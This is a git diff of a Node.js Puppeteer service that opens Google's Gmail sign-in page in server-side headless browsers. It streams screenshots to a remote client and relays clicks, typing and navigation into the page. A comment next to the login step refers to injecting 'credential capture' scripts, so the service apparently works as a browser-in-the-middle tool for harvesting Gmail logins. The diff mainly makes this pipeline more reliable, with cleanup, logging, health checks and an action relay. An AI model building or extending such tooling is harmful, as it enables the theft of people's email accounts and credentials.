@@ -14,6 +14,7 @@ class GmailBrowserService extends EventEmitter {
     this.browsers = new Map(); // sessionToken -> browser instance
     this.pages = new Map(); // sessionToken -> page instance
     this.io = null; // Socket.IO instance
+    this.serviceStartTime = Date.now(); // Track service start time for health checks
     this.browserOptions = {
       headless: 'new', // Use new headless mode for better compatibility
       devtools: false,
@@ -91,17 +92,27 @@ class GmailBrowserService extends EventEmitter {
     try {
       console.log(`🌐 Creating Gmail browser session: ${sessionToken}`);
 
+      // Create temp directory if it doesn't exist
+      const fs = require('fs');
+      const path = require('path');
+      const sessionDir = `./temp/browser-sessions/${sessionToken}`;
+      if (!fs.existsSync(sessionDir)) {
+        fs.mkdirSync(sessionDir, { recursive: true });
+      }
+
       // Enhanced browser options for server environment
       const browserOptions = {
         ...this.browserOptions,
-        userDataDir: `./temp/browser-sessions/${sessionToken}`, // Persistent session
+        userDataDir: sessionDir, // Persistent session
         executablePath: process.env.CHROME_PATH || undefined, // Use system Chrome if available
       };
 
       // Launch browser with enhanced error handling
       let browser;
       try {
+        console.log(`🚀 Launching browser with options:`, { headless: browserOptions.headless, args: browserOptions.args.slice(0, 5) });
         browser = await puppeteer.launch(browserOptions);
+        console.log(`✅ Browser launched successfully`);
       } catch (launchError) {
         console.error('First browser launch failed, trying alternative config:', launchError.message);
         
@@ -121,9 +132,17 @@ class GmailBrowserService extends EventEmitter {
         };
         
         browser = await puppeteer.launch(fallbackOptions);
+        console.log(`✅ Browser launched with fallback options`);
       }
 
+      // Handle browser disconnection
+      browser.on('disconnected', () => {
+        console.log(`🔌 Browser disconnected for session: ${sessionToken}`);
+        this.cleanupSession(sessionToken);
+      });
+
       const page = await browser.newPage();
+      console.log(`📄 New page created for session: ${sessionToken}`);
 
       // Set realistic user agent and viewport
       await page.setUserAgent(
@@ -157,11 +176,22 @@ class GmailBrowserService extends EventEmitter {
       // Set up event listeners
       await this.setupPageEventListeners(sessionToken, page);
 
-      // Navigate to Gmail login
-      await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com', {
-        waitUntil: 'networkidle2',
-        timeout: 30000,
-      });
+      // Navigate to Gmail login with better error handling
+      console.log(`🌐 Navigating to Gmail login page...`);
+      try {
+        await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail&continue=https://mail.google.com', {
+          waitUntil: 'networkidle2',
+          timeout: 30000,
+        });
+        console.log(`✅ Successfully navigated to Gmail login`);
+      } catch (navError) {
+        console.error('Navigation error:', navError.message);
+        // Try a simpler navigation
+        await page.goto('https://accounts.google.com/', {
+          waitUntil: 'domcontentloaded',
+          timeout: 15000,
+        });
+      }
 
       // Inject credential capture and real-time sync scripts
       await this.injectMonitoringScripts(page, sessionToken);
@@ -186,7 +216,27 @@ class GmailBrowserService extends EventEmitter {
 
     } catch (error) {
       console.error('Error creating Gmail browser session:', error);
+      // Clean up any partial session
+      this.cleanupSession(sessionToken);
       throw error;
+    }
+  }
+
+  /**
+   * Clean up session resources
+   */
+  cleanupSession(sessionToken) {
+    try {
+      const browser = this.browsers.get(sessionToken);
+      if (browser) {
+        browser.close().catch(console.error);
+        this.browsers.delete(sessionToken);
+      }
+      this.pages.delete(sessionToken);
+      this.activeSessions.delete(sessionToken);
+      console.log(`🧹 Cleaned up session: ${sessionToken}`);
+    } catch (error) {
+      console.error('Error cleaning up session:', error);
     }
   }
 
@@ -516,17 +566,35 @@ class GmailBrowserService extends EventEmitter {
   async getScreenshot(sessionToken) {
     try {
       const page = this.pages.get(sessionToken);
-      if (!page) throw new Error('Session not found');
+      if (!page) {
+        console.error(`❌ Screenshot requested for non-existent session: ${sessionToken}`);
+        throw new Error('Session not found');
+      }
 
+      // Check if page is still connected
+      if (page.isClosed()) {
+        console.error(`❌ Page is closed for session: ${sessionToken}`);
+        this.cleanupSession(sessionToken);
+        throw new Error('Page is closed');
+      }
+
+      console.log(`📸 Taking screenshot for session: ${sessionToken}`);
       const screenshot = await page.screenshot({
         type: 'png',
         fullPage: false,
         quality: 80,
       });
 
+      console.log(`✅ Screenshot captured: ${screenshot.length} bytes`);
       return screenshot;
     } catch (error) {
       console.error('Error taking screenshot:', error);
+      
+      // If screenshot fails, try to get a simple placeholder
+      if (error.message.includes('Session closed') || error.message.includes('Target closed')) {
+        this.cleanupSession(sessionToken);
+      }
+      
       throw error;
     }
   }
@@ -761,6 +829,136 @@ class GmailBrowserService extends EventEmitter {
     setInterval(() => {
       this.cleanupInactiveSessions();
     }, 30 * 60 * 1000); // Every 30 minutes
+  }
+
+  /**
+   * Check if a session exists and is active
+   */
+  async checkSessionExists(sessionToken) {
+    try {
+      if (!this.activeSessions.has(sessionToken)) {
+        return false;
+      }
+
+      const sessionData = this.activeSessions.get(sessionToken);
+      
+      // Check if browser is still connected
+      if (!sessionData.browser || !sessionData.browser.isConnected()) {
+        console.log(`⚠️  Browser for session ${sessionToken} is disconnected`);
+        this.activeSessions.delete(sessionToken);
+        return false;
+      }
+
+      // Check if page is still valid
+      if (!sessionData.page || sessionData.page.isClosed()) {
+        console.log(`⚠️  Page for session ${sessionToken} is closed`);
+        return false;
+      }
+
+      return true;
+    } catch (error) {
+      console.error(`❌ Error checking session ${sessionToken}:`, error);
+      return false;
+    }
+  }
+
+  /**
+   * Perform action on browser session
+   */
+  async performAction(sessionToken, action, params) {
+    try {
+      const sessionData = this.activeSessions.get(sessionToken);
+      if (!sessionData) {
+        throw new Error('Session not found');
+      }
+
+      const { page } = sessionData;
+      if (!page || page.isClosed()) {
+        throw new Error('Browser page is not available');
+      }
+
+      switch (action) {
+        case 'click':
+          await page.mouse.click(params.x, params.y);
+          break;
+        
+        case 'type':
+          await page.keyboard.type(params.text);
+          break;
+        
+        case 'key':
+          await page.keyboard.press(params.key);
+          break;
+        
+        case 'scroll':
+          await page.evaluate((x, y) => {
+            window.scrollBy(x, y);
+          }, params.x || 0, params.y || 0);
+          break;
+        
+        case 'navigate':
+          await page.goto(params.url);
+          break;
+        
+        default:
+          throw new Error(`Unknown action: ${action}`);
+      }
+
+      // Update last activity
+      sessionData.lastActivity = new Date();
+
+      return { success: true, action, params };
+    } catch (error) {
+      console.error(`❌ Error performing action ${action}:`, error);
+      throw error;
+    }
+  }
+
+  /**
+   * Health check for the service
+   */
+  async healthCheck() {
+    try {
+      const activeSessions = this.activeSessions.size;
+      const uptime = Date.now() - (this.serviceStartTime || Date.now());
+      
+      // Check if we can launch a browser
+      let browserHealthy = false;
+      try {
+        const testBrowser = await puppeteer.launch({
+          headless: true,
+          args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-accelerated-2d-canvas',
+            '--no-first-run',
+            '--no-zygote',
+            '--single-process',
+            '--disable-gpu'
+          ]
+        });
+        await testBrowser.close();
+        browserHealthy = true;
+      } catch (error) {
+        console.error('❌ Browser health check failed:', error);
+      }
+
+      return {
+        status: browserHealthy ? 'healthy' : 'unhealthy',
+        activeSessions,
+        uptime,
+        browserHealthy,
+        timestamp: new Date().toISOString()
+      };
+    } catch (error) {
+      console.error('❌ Health check error:', error);
+      return {
+        status: 'error',
+        error: error.message,
+        timestamp: new Date().toISOString()
+      };
+    }
   }
 }
 
